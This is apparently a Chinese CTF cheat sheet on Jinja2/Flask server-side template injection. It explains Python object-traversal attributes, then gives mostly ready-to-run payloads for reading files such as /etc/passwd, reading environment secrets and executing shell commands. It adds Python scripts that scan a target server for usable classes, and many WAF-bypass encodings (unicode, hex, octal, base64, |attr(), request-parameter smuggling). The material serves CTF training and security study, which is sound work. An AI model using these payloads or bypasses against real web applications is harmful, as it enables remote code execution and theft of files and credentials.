# 自动化工具
### 焚靖
[焚靖](https://github.com/Marven11/Fenjing) 是一个针对CTF比赛中`Jinja SSTI`绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。
### dibber
[dibber](https://github.com/Macr0phag3/dibber) 用于搜索 Python 特定的对象/函数/模块，产出的 payload 的可用于 Python 沙箱逃逸、SSTI 等等。
# SSTI中的魔术方法

`__class__`：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。`__class__`是类的一个内置属性，表示类的类型，返回 `<type 'type'>` ； 也是类的实例的属性，表示实例对象的类。

`__bases__`：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的**元组**（虽然只有一个元素）。注意是直接父类！！

获取基类还能用`__mro__`方法，`__mro__` 方法可以用来获取一个类的调用顺序，比如：

```python
>>> ''.__class__.__mro__   // python2下和python3下不同
(<class 'str'>, <class 'object'>)
>>> [].__class__.__mro__
(<class 'list'>, <class 'object'>)
>>> {}.__class__.__mro__
(<class 'dict'>, <class 'object'>)
>>> ().__class__.__mro__
(<class 'tuple'>, <class 'object'>)

>>> ().__class__.__mro__[1]            // 返回的是一个类元组，使用索引就能获取基类了
<class 'object'>
```

除此之外，我们还可以利用 `__base__`方法获取直接基类：

```python
>>> "".__class__.__base__
<type 'basestring'>
```

有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（`<class'object'>`）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。

`__subclasses__()`：查看当前类的子类组成的列表，即返回基类object的子类。

```python
>>> [].__class__.__bases__[0].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>]
```

**注意：**这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。

当然我们也可以直接用`object.subclasses()`，会得到和上面一样的结果。SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。

`__builtins__`：以一个集合的形式查看其引用

`__globals__`：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。

```
__import__()`：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用` __import__() `来动态载入，就是` import`。语法：`__import__(模块名)
```

这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的

找到父类<type 'object'> ---> 寻找子类 ---> 找关于命令执行或者文件操作的模块。

# 利用ssti读文件

## python2

file类可以直接用来读取文件

```python
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
```

## python3

使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用`<class '_frozen_importlib_external.FileLoader'>`这个类去读取文件。

首先编写脚本遍历目标Python环境中 `<class '_frozen_importlib_external.FileLoader'>` 这个类索引号：

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url, headers=headers)
    if 'FileLoader' in res.text:
        print(i)

# 得到编号为79
```

所以payload如下：

```python
{{().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")}}
```

# 利用SSTI命令执行

可以用来执行命令的类有很多，其基本原理就是遍历含有eval函数即os模块的子类，利用这些子类中的eval函数即os模块执行命令。这里我们简单挑几个常用的讲解。

### 寻找内建函数 eval 执行命令

首先编写脚本遍历目标Python环境中含有内建函数 eval 的子类的索引号：

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"

    res = requests.get(url=url, headers=headers)
    if 'eval' in res.text:
        print(i)
```

我们可以记下几个含有eval函数的类：

- warnings.catch_warnings
- WarningMessage
- codecs.IncrementalEncoder
- codecs.IncrementalDecoder
- codecs.StreamReaderWriter
- os._wrap_close
- reprlib.Repr
- weakref.finalize

所以payload如下：

```python
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

### 寻找 os 模块执行命令

Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。

首先编写脚本遍历目标Python环境中含有os模块的类的索引号：

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"

    res = requests.get(url=url, headers=headers)
    if 'os.py' in res.text:
        print(i)

# 可以得到一大堆类
64
65
66
67
68
79
80
81
83
117
147
154
161
162
163
164
...
```

随便挑一个类构造payload执行命令即可：

```python
{{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}}
```

但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。

我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 os._wrap_close，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。

### 寻找 popen 函数执行命令

首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"

    res = requests.get(url=url, headers=headers)
    if 'popen' in res.text:
        print(i)

# 得到编号为117
```

直接构造payload即可：

```python
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}
```

### 寻找 importlib 类执行命令

Python 中存在`<class '_frozen_importlib.BuiltinImporter'>` 类，目的就是提供 Python 中 import 语句的实现（以及`__import__`函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。

首先编写脚本遍历目标Python环境中 importlib 类的索引号

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url, headers=headers)
    if '_frozen_importlib.BuiltinImporter' in res.text:
        print(i)

# 得到编号为69
```

构造如下payload即可执行命令：

```python
{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls /").read()}}
```

### 寻找 linecache 函数执行命令

linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。

首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"

    res = requests.get(url=url, headers=headers)
    if 'linecache' in res.text:
        print(i)

# 得到一堆子类的索引:
168
169
203
206
207
208
...
```

随便挑一个子类构造payload即可：

```python
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}

{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}
```

### 寻找 subprocess.Popen 类执行命令

从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。

subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。

首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}

for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url, headers=headers)
    if 'linecache' in res.text:
        print(i)

# 得到索引为245
```

则构造如下payload执行命令即可：

```python
{{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}

# {{[].__class__.__base__.__subclasses__()[245]('要执行的命令',shell=True,stdout=-1).communicate()[0].strip()}}
```

# 格式化字符串漏洞读环境变量

2023鹏城杯Web-Escape举例子。关键代码如下。username可控。

```python
     return ("Sorry, we couldn't find a user '{user}' with password hash <code>{{passhash}}</code>!"
                .format(user=username)
                .format(passhash=new_pwd)
                )
```

最后的payload如下

```
{passhash.__str__.__globals__[app].wsgi_app.__globals__[os].environ}
```

还有一个题也是读变量的哈工大办的2022HITCTF

```python
根据源代码，这里关键要解密一个flag。那么可以用下面payload读flag和密钥还有一个nonce。再解密即可
?ha=__class__&hb=__base__&hc=__base__&hd=__subclasses__&he=__init__&hf=__globals__&hg=__builtins__&ah=eval&exp=__import__('app').flag&expression=[][request[dict(a=1,rgs=2)|join][dict(h=1,a=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,b=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,c=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,d=2)|join]]()[191][request[dict(a=1,rgs=2)|join][dict(h=1,e=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,f=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,g=2)|join]][request[dict(a=1,rgs=2)|join][dict(a=1,h=2)|join]](request[dict(a=1,rgs=2)|join][dict(e=1,xp=2)|join])
```

另一个payload

```
{error.__class__.__init__.__globals__[app].wsgi_app.__globals__[os].environ}
```

# 绕过

## 关键字绕过

### 利用字符串拼接绕过

我们可以利用“+”进行字符串拼接，绕过关键字过滤，例如：

```python
{{().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("o"+"s").popen("ls /").read()')}}

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("ls /").read()')}}
```

只要返回的是**字典类型**的或是**字符串格式**的，即payload中引号内的，在调用的时候都可以使用字符串拼接绕过。

### 利用编码绕过

我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13、16进制编码等。

### 利用Unicode编码绕过关键字（flask适用）

我们可以利用unicode编码的方法，绕过关键字过滤，例如：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

### 利用Hex编码绕过关键字

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

### 利用引号绕过

我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 fl""ag 或 fl''ag 的形式来绕过：

```python
[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()
```

再如：

```python
().__class__.__base__.__subclasses__()[77].__init__.__globals__['o''s'].popen('ls').read()

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil''tins__']['eval']('__import__("os").popen("ls /").read()')}}
```

可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用引号绕过。

### 利用join()函数绕过

我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：

```python
[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
```

### 翻转[::-1]

```python
{{url_for.__globals__.os.system('calc')}}
{{url_for.__globals__['so'[::-1]].system('calc')}}
```

### replace函数

```python
{{url_for.__globals__.os["sysatem".replace("a","")]('calc')}}
```

### cookie绕过

```python
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
Cookie:arg1=open;arg2=/etc/passwd
```

### 过滤数字

```python
{{""["_" "_cla" "ss_" "_"]["_" "_ba" "se_" "_"]["_" "_subcla" "sses_" "_"]()
['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab'.index('b')]
["_" "_in" "it_" "_"]["_" "_glo" "bals_" "_"]
['po' 'pen']('cat /flag').read()}}
```

### 全角绕过

```python
{{[].__ｃｌａｓｓ__．__ｂａｓｅ__．__ｓｕｂｃｌａｓｓｅｓ__()[99]['ｇｅｔ__data'](0,"/ｄａｔａ")}}
```

### 八进制绕过

```python
data={{()["__\\143\\154\\141\\163\\163__"]["__\\155\\162\\157__"][1]["__\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163__"]()[247]["__\\151\\156\\151\\164__"]["__\\147\\154\\157\\142\\141\\154\\163__"]["\\157\\163"]["\\160\\157\\160\\145\\156"]("\\143\\141\\164\\40\\57\\146\\154\\141\\147")["\\162\\145\\141\\144"]()}}
```

## 绕过其他字符

### 过滤了中括号[ ]

#### 利用 **getitem**() 绕过

可以使用 **getitem**() 方法输出序列属性中的某个索引处的元素，如

```python
"".__class__.__mro__[2]
"".__class__.__mro__.__getitem__(2)
['__builtins__'].__getitem__('eval')
```

如下示例：

```python
{{''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)('/etc/passwd').read()}}       // 指定序列属性

{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性
```

#### 利用 pop() 绕过

pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，如下示例：

```python
{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}       // 指定序列属性

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性
```

注意：最好不要用pop()，因为pop()会删除相应位置的值。

#### 利用字典读取绕过

我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 [] 里来访问，一种就是用点 . 来访问。所以，当方括号 [] 被过滤之后，我们还可以用点 . 的方式来访问，如下示例

```python
// __builtins__.eval()

{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
```

等同于：

```python
// [__builtins__]['eval']()

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

### 过滤了引号

#### 利用chr()绕过

先获取chr()函数，赋值给chr，后面再拼接成一个字符串

```python
{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}

# {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
```

等同于

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
```

#### 利用request对象绕过

示例：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。

### 过滤了下划线__

#### 利用request对象绕过

```python
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__

{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

### 过滤了点 .

#### 利用 `|attr()` 绕过（适用于flask）

如果`.` 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数`attr()`，即：

```python
().__class__   =>  ()|attr("__class__")
```

示例：

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}
```

等同于：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

#### 利用中括号[ ]绕过

如下示例：

```python
{{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

等同于：

```python
{{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__("os").popen("ls /").read()')}}
```

**这样的话，那么** `**__class__**`**、**`**__bases__**` **等关键字就成了字符串，就都可以用前面所讲的关键字绕过的姿势进行绕过了。**

### 过滤了大括号 {{

我们可以用Jinja2的 {%...%} 语句装载一个循环控制语句来绕过：

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
```

也可以使用`{% if ... %}1{% endif %}`配合 `os.popen`和 `curl` 将执行结果外带（不外带的话无回显）出来：

```python
{% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls /' %}1{% endif %}
```

也可以用 {%print(......)%} 的形式来代替 {{ ，如下：

```python
{%print(''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read())%}
```

```python
{%print(config.__class__.__init__.__globals__['os'].popen('whoami').read())%}
```

## 利用 |attr() 来Bypass

这里说一个新东西，就是原生JinJa2函数 `attr()`，这是一个`attr()` 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（`|`）分割。如：

```python
foo|attr("bar")   等同于   foo["bar"]
```

`|attr()` 配合其他姿势可同时绕过双下划线`__`、引号、点 . 和 [ 等，下面给出示例。

### 同时过滤了 . 和 []

过滤了以下字符：

```python
.    [
```

绕过姿势：

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
```

等同于：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
```

### 同时过滤了 __ 、点. 和 []

下面我们演示绕过姿势，先写出payload的原型：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

由于中括号 [ 被过滤了，我们可以用 **getitem**() 来绕过（尽量不要用pop()），类似如下：

```python
{{().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}
```

由于还过滤了下划线`__`，我们可以用request对象绕过，但是还过滤了中括号 `[]`，所以我们要同时绕过`__` 和 `[`，就用到了我们的`|attr()`
所以最终的payload如下：

```python
{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read()
```

### 用Unicode编码配合 |attr() 进行Bypass

过滤了以下字符：

```python
'  request  {{  _  %20(空格)  [  ]  .  __globals__   __getitem__
```

我们用`{%...%}`绕过对`{{`的过滤，并用unicode绕过对关键字的过滤。unicode绕过是一种网上没提出的方法。

假设我们要构造的payload原型为：

```python
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
```

先用`|attr` 绕过`.`和`[]`：

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
```

我们可以将过滤掉的字符用unicode替换掉：

```python
{{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}
```

### 用Hex编码配合 |attr() 进行Bypass

我们可以将过滤掉的字符用Hex编码替换掉：

```python
{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(258)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("os")|attr("popen")("cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()}}
```

## 使用 JinJa 的过滤器进行Bypass

以下是内置的所有的过滤器列表：

| [abs()](https://jinja.palletsprojects.com/en/master/templates/#abs) | [float()](https://jinja.palletsprojects.com/en/master/templates/#float) | [lower()](https://jinja.palletsprojects.com/en/master/templates/#lower) | [round()](https://jinja.palletsprojects.com/en/master/templates/#round) | [tojson()](https://jinja.palletsprojects.com/en/master/templates/#tojson) |
| --- | --- | --- | --- | --- |
| [attr()](https://jinja.palletsprojects.com/en/master/templates/#attr) | [forceescape()](https://jinja.palletsprojects.com/en/master/templates/#forceescape) | [map()](https://jinja.palletsprojects.com/en/master/templates/#map) | [safe()](https://jinja.palletsprojects.com/en/master/templates/#safe) | [trim()](https://jinja.palletsprojects.com/en/master/templates/#trim) |
| [batch()](https://jinja.palletsprojects.com/en/master/templates/#batch) | [format()](https://jinja.palletsprojects.com/en/master/templates/#format) | [max()](https://jinja.palletsprojects.com/en/master/templates/#max) | [select()](https://jinja.palletsprojects.com/en/master/templates/#select) | [truncate()](https://jinja.palletsprojects.com/en/master/templates/#truncate) |
| [capitalize()](https://jinja.palletsprojects.com/en/master/templates/#capitalize) | [groupby()](https://jinja.palletsprojects.com/en/master/templates/#groupby) | [min()](https://jinja.palletsprojects.com/en/master/templates/#min) | [selectattr()](https://jinja.palletsprojects.com/en/master/templates/#selectattr) | [unique()](https://jinja.palletsprojects.com/en/master/templates/#unique) |
| [center()](https://jinja.palletsprojects.com/en/master/templates/#center) | [indent()](https://jinja.palletsprojects.com/en/master/templates/#indent) | [pprint()](https://jinja.palletsprojects.com/en/master/templates/#pprint) | [slice()](https://jinja.palletsprojects.com/en/master/templates/#slice) | [upper()](https://jinja.palletsprojects.com/en/master/templates/#upper) |
| [default()](https://jinja.palletsprojects.com/en/master/templates/#default) | [int()](https://jinja.palletsprojects.com/en/master/templates/#int) | [random()](https://jinja.palletsprojects.com/en/master/templates/#random) | [sort()](https://jinja.palletsprojects.com/en/master/templates/#sort) | [urlencode()](https://jinja.palletsprojects.com/en/master/templates/#urlencode) |
| [dictsort()](https://jinja.palletsprojects.com/en/master/templates/#dictsort) | [join()](https://jinja.palletsprojects.com/en/master/templates/#join) | [reject()](https://jinja.palletsprojects.com/en/master/templates/#reject) | [string()](https://jinja.palletsprojects.com/en/master/templates/#string) | [urlize()](https://jinja.palletsprojects.com/en/master/templates/#urlize) |
